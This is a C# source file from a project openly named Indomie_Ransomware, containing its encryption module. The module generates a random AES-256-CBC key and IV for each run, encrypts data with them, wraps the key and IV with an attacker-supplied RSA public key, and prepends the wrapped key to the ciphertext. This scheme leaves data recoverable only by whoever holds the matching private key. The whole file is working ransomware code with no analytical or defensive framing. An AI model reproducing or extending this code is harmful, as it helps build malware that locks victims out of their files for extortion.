using System;
using System.Collections.Generic;
using System.Linq;
using System.Security.Cryptography;
using System.Text;
using System.Threading.Tasks;

namespace Indomie_Ransomware.Encryption
{
    internal class Encryption
    {
        byte[] AesKey = new byte[32];
        byte[] AesIv = new byte[16];
        byte[] encryptionKey = new byte[48];
        public Encryption()
        {
            
            Aes aes = Aes.Create();
            aes.KeySize = 256;
            aes.BlockSize = 128;
            aes.Mode = CipherMode.CBC;
            aes.Padding = PaddingMode.PKCS7;
            aes.GenerateKey();
            aes.GenerateIV();
            byte[] key = aes.Key;
            byte[] iv = aes.IV;
            byte[] encryptionKey = new byte[key.Length + iv.Length];
            Array.Copy(key, 0, encryptionKey, 0, key.Length);
            Array.Copy(iv, 0, encryptionKey, key.Length, iv.Length);
            //return encryptionKey;
            this.encryptionKey = encryptionKey;
            this.AesKey = key; this.AesIv = iv;
        }
        public byte[] AesEncrypt(byte[] data)
        {
            using (var aes = Aes.Create())
            {
                aes.Mode = CipherMode.CBC;
                aes.Padding = PaddingMode.PKCS7;
                aes.Key = AesKey;
                aes.IV = AesIv;
                using (MemoryStream ms = new MemoryStream())
                {
                    using (CryptoStream cs = new CryptoStream(ms, aes.CreateEncryptor(), CryptoStreamMode.Write))
                    {
                        cs.Write(data, 0, data.Length);
                    }
                    return ms.ToArray();
                }
                
            }
        }
        public byte[] RsaEncrypt(byte[] data)
        {
            using (RSA rsa = RSA.Create())
            {
                rsa.ImportSubjectPublicKeyInfo(Convert.FromBase64String(Config.RSA_PublicKeyBase64), out _);
                return rsa.Encrypt(data, RSAEncryptionPadding.OaepSHA256);
            }
        }
        public byte[] Encrypt(byte[] data)
        {
            byte[] encryptedAesKeyIv = RsaEncrypt(encryptionKey);
            byte[] encryptedData = AesEncrypt(data);
            byte[] result = new byte[encryptedData.Length + encryptedAesKeyIv.Length];
            Array.Copy(encryptedAesKeyIv, 0, result, 0, encryptedAesKeyIv.Length);
            Array.Copy(encryptedData,0, result, encryptedAesKeyIv.Length, encryptedData.Length);
            return result;
        }
    }
}
